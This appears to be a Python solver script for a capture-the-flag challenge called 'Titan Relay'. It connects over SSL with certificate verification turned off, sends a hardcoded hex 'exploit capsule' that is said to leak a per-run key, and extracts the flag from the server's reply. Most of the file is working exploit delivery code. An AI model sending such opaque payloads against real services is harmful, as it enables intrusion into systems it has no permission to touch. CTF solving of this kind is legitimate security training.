#!/usr/bin/env python3
# Titan Relay solver — connects over TCP+SSL and recovers the flag.
# Usage: python3 solve_titan.py [host] [port]
import socket, ssl, sys, time

HOST = sys.argv[1] if len(sys.argv) > 1 else "titan-relay-e0c86e95a24b.chall.hiddeninvestigations.net"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337

# Self-contained exploit capsule (hex). It leaks the per-run key at runtime,
# so the same bytes work on every connection.
CAP = "50aeeb2814a3df1c2894d3117f8b31fb414cb90eca73beefe97ea3a02f59602b115f8fc905427f8efdc18cb1fc293d9ebd78199bd4204c88c9065283d19b505af3ed295aa6e61f5d88d56728f9ca4547808cf83d75b2dd2d61a6e3125f92d715e08dcbab402240583a7381f3246aa755245d19dd35608ac5094732c5ff7872b5c32b61a8e5335c97d91653a2ce00478565fb3a4ab0f92f6c18e023c39a1ae8f097c95a"
LEN = len(CAP) // 2

ctx = ssl._create_unverified_context()
s = socket.create_connection((HOST, PORT), timeout=30)
ss = ctx.wrap_socket(s, server_hostname=HOST)

def pump(t):
    ss.settimeout(t); out = b""
    try:
        while True:
            d = ss.recv(4096)
            if not d: break
            out += d
    except Exception:
        pass
    return out

banner = pump(4)
ss.sendall(f"1\n{LEN}\n{CAP}\n2\n".encode())
out = banner + pump(8)
text = out.decode("latin1")
sys.stdout.write(text)
for line in text.splitlines():
    if "hiCTF{" in line:
        print("\n[*] FLAG:", line.strip())
